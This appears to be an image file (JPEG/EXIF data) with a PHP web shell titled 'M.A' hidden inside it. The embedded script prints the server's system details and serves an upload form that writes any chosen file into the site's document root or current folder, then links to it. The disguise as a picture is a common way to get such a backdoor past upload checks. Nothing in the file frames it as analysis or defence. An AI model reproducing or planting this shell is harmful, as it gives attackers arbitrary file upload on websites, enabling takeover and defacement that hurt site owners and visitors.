ÿØÿátExif  MM *       0   4        ‡i      d      <title>M.A </title>
<?php
echo "Powered By M.A<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx_file'>
<input type='submit' name='upload' value='upload'>
</form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
if(is_writable($root)) {
if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "sukses..!! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
} else {
echo "failed to upload in the document root.";
}
} else {
if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
echo "sukses upload <b>$files</b> di folder ini";
} else {
echo "gagal upload";
}
}
}
?>         ÿà JFIF      ÿÛ C 


ÿÛ C		ÿÀ  T T" ÿÄ              	ÿÄ I        !1AQRU”Ñ	"7SWaqu’¡ÒÓ5Tb‘“³#23B´tƒ•²ÁÿÄ             ÿÄ 0 	        QR¡±1ASq‘Ñáð34aÁbÿÚ   ? µ1Ž‘lœÊôÜžÑ"Ã¤FDÚÍJ[TÊ|WLÉ·d¸FyÎ`dfÚDfœK8Ô’=X‰#Ò¼1%rç4¸©™Êý1•š¨ÄB‹…*}$eïtŽ“ÒúÂ;B­
Á»Ž…Õr«rîå.¦”˜Ñb¤øÉ¶ö£Á%Ä67½¯yT½ºÌ’ÔÇh<¢_8îòM‘ÒzRXGh4Ž“ÒúÂ;B»½í{Ê¥ëÖcüo{^ò©{u˜ÿ $˜ßGÑÇw’h´Ž“ÒúÂ;A¤tž”‡ÖÚÝïkÞUo^³äƒ{Ú÷•[×¬Çù ÔÆøò>ˆÎ;¼“JÍr›%Âmª„WV|	CÉ3?xÞ
$ûô…oÑ2]—QAg5¼ÜyPÞ>$8¬Œˆø1#Ä„·±¿+eBÌ.Ls‡-
v<˜†³^æ’Ê‰6J=fžù
N8žÀÌðÄC-1š`Ü|Ú»d¡ÇD‹0  	©ÐÝ™ò·á“—ñÃkºP¬Øh8A)Ùðþæ—f¼Z¶»ƒ?ðŽÑ‹,8^©ƒ¿‘JÕBOw5ì•p(Ë;”cHï*î¾ý]÷Œi_Ú÷‹­X¤³T·¤Î÷ƒHï&•ý¯xäÝÎn¸”%dJY’KÒgWFjš©Q¯-I§C~a§ù¤bIôŸ³¡×GD?í£âE¹AlÑ"S¢ Ó$™—
Õ†µ)™âcÎ×2Ëe[•Géµ‚,y¬(’ëX)FƒáÀÍ$e˜Rg½î´mº{@4]ÅBe]Ú¤yªJóLŒøŸÝVõeïpÕWøîc¼û½¨Jq·	M›ËRUÊYÆd€÷ÏÕí¶,•ó«~(ŠbÒ¦,ºW“´R±;Jaâ›À 4¬ÐÎè’Í¸6êÓ©I¬8¢ô”VÌ<aîŠýoúÙßñ¸_æGãÈ¤êþÃ¾u¥Ê&P£Je+[éeÃ.ù<ÿ GvœÅúã^Ø‰À>ƒ’ÕÌ*XÓ˜¿\kÛžH2ete~µkqP…
bxß•µ¨”D•žšx÷¦AT^Ä“–¦DmJ­½«"eF¨—ÙTâ	&Ú,ãRÒdx‘ñ c$ŽèÜ§…Ísí!°V/ÄÌ£lhÊÉÜ5Zz)›†l÷_cmšiVb•‰bY‡‡AkÊÎ«Ë¯\6ãÔúòêÔÇž„¥µ³hÞF%‰(Ü#ÍÇx}ÃBjó«¶æÊöq0Ù$•‹íªrd´—Ðü„Û$¶¬â5™pòbA°îzx<sÖ“¿N ¯ÃR–yË<V­j??°>ç§ƒÇ=i;ôâ^.ÀÊCm¡TÑ¸ºoœ  ´ßtWèëÖÎÿ ˆØy}³ŠÞ‹pE¤¢RœJZª-IÚÕ‡T½BÏ6¬ŒŸß"”«…ÃçJ¯Ð	7{jO>Wæ`7¶¤óå~av¢æµf´JŒ†Õ+éH_êÿ ¹	{jO>Wæ`Ø§dâ”šŒEäâO¶Ô.yy‡†FÙzn­´ø?ì‡ðñ”/^ËýCÄ+.6~Y/y..A8íbJÕš²"ÄÖ|†7plÏ¾Ïê»ÄØÞô½‹îzx<sÖ“¿N Rw¶¤óå~avKa%=ÐÜñÃB§ÍYí‡‰âhŒ\žaoŒ¼:–ÃhIP´‰¯úM  ƒZße…ƒX¹-Ã‘D„uƒ&[	y‡ ó4“=Yù¹ªIvjˆµ™±ªLVf°¶_i4²ÁHYbG÷	¡•ÐÈ$oH\=í-=j¢&_U
|—#J·¥EÚ+eòZ“ä4šÈÇNøò:Ïi_¶…ÚpTz—-Ä”Ëpˆ½ðÆˆAñ³zãŸÒpuÅÇÙUê‚©ñät3žÒ¾ÍŒ¥ÈaöœýŠâ³•áž­x7Ì-“D øÙ½qÏˆ!ÆÍëŽ|@úã{.>ÈÔÿ tœ~òIžM—ÿ &¯kÃ,ò.Ë®±[;}È§P”ä§mR¶¼ãÇ7ÂÇ\¨h„7®9ñD øÙ½qÏˆ)#ONK¢‚Äÿ £è¦}4’>N
¨éW…Z»=˜TÛfmBcÊ$·*Vã‹>B"@°­Œv-FÒ³¢&¨Ê#Îþ+ÒmÂq-¼é§ÉE©Y‰mfZ³DFxb%4ÚTòÄ–r^Aê4;)Å$üÆYÚÇ×e–ã´–ÚB[m%‚R’Àˆ¼Ä!­Ä[tG}×pRˆN‘7+˜ Lž@  !   „    @  !   …ÿÙ